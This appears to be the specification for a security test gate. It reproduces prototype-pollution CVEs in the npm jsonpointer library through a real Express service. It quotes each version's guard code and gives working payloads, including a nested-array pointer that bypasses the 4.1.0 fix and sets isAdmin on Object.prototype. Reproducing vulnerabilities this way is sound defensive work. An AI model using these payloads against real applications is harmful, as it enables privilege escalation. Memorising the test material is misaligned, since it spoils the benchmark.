pp2-json-pointer — REAL-DOCKER GATE, run_mode=real-app-http
CVE-2020-7709 (V1=TARGET, incomplete) -> CVE-2021-23820 / CVE-2022-4742 (V2)
Prototype pollution (CWE-1321) in npm `jsonpointer` (janl/node-jsonpointer) set()/setter() key-walk.
Rebuilt 2026-07-15 to comply with the HARD POLICY: the REAL published jsonpointer is npm-installed per
version and stood up inside a REAL Express service; the library CVE is triggered ONLY by a REAL
EXTERNAL HTTP request (POST /set) and observed by an EXTERNAL GET /check. NO in-process probe, NO
source-lift. jsonpointer is dependency-free (no transitive gate masks the pollution).

Versions (real npm bytes, verified verbatim against jsonpointer.js in each tarball):
  V0 = jsonpointer 4.0.1  (pre CVE-2020-7709: setter() has NO magic-property guard)
  V1 = jsonpointer 4.1.0  (CVE-2020-7709 fix; TARGET; strict `===` STRING guard on RAW pointer[1] only)
  V2 = jsonpointer 5.0.0  (CVE-2021-23820/CVE-2022-4742 fix; compilePointer() per-element type-check
                           + per-segment loop guard)

Source-verified guard (jsonpointer.js setter(), verbatim):
  4.0.1: (none) — loop `for(p=1..)` derefs obj=obj[part], leaf obj[part]=value; no check.
  4.1.0: BEFORE the loop:
           if (pointer[1] === 'constructor' && pointer[2] === 'prototype') return obj
           if (pointer[1] === '__proto__') return obj      <-- RAW pointer[1], strict ===, no coercion
  5.0.0: guard MOVED INTO the loop (every segment):
           if (pointer[p] === 'constructor' || pointer[p] === 'prototype' || pointer[p] === '__proto__') return obj
         AND compilePointer() type-checks every array element:
           for (const part of pointer) if (typeof part !== 'string' && typeof part !== 'number') throw

Payloads (POST /set {pointer,value}, value=true), against real jsonpointer.set({}, pointer, value):
  ORIGINAL/seed  (CVE-2020-7709):  pointer = "/__proto__/isAdmin"       (RFC-6901 string)
  RESIDUAL       (CVE-2021-23820): pointer = ["", ["__proto__"], "isAdmin"]   (3-ELEMENT array;
       element at index 1 is the nested array ["__proto__"]. setter loops from index 1 and the V1
       guard reads pointer[1], so the array must land at index 1; index 0 is a dummy mirroring the
       leading empty split segment of "/a/b".split('/'). The 2-element [["__proto__"],"isAdmin"]
       form Snyk cites lands the array at the SKIPPED index 0 and does NOT pollute — confirmed by the
       3-element form succeeding below and matching the source walk.)

Oracle: restarts the target container (fresh node process => clean Object.prototype) before each
probe, POSTs /set over external HTTP, then GETs /check. /check emits ${PCB_FLAG} iff a fresh object
inherits isAdmin===true (default-deny authz gate flipped by prototype pollution).

